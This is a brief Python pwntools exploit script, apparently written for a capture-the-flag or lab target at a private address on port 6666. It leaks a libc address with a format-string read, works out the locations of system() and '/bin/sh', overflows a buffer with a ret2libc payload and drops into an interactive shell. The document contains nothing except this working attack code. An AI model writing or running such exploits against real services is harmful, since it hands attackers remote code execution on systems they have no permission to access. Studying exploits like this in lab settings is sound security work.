from pwn import *

r = remote("192.168.56.101", 6666)
lib = ELF("/lib/libc.so.6")

r.sendline("%19$lx")
data = r.recv(1024)
init_cacheinfo_addr = int(data, 16) - 97
system_addr = lib.symbols["system"] - lib.symbols["init_cacheinfo"] + init_cacheinfo_addr
sh_addr = lib.search("/bin/sh").next() - lib.symbols["init_cacheinfo"] + init_cacheinfo_addr
pay  = ''
pay += ( 'a'*0x5c + p32(system_addr) + "BBBB" +  p32(sh_addr) )
r.sendline(pay)
r.interactive()
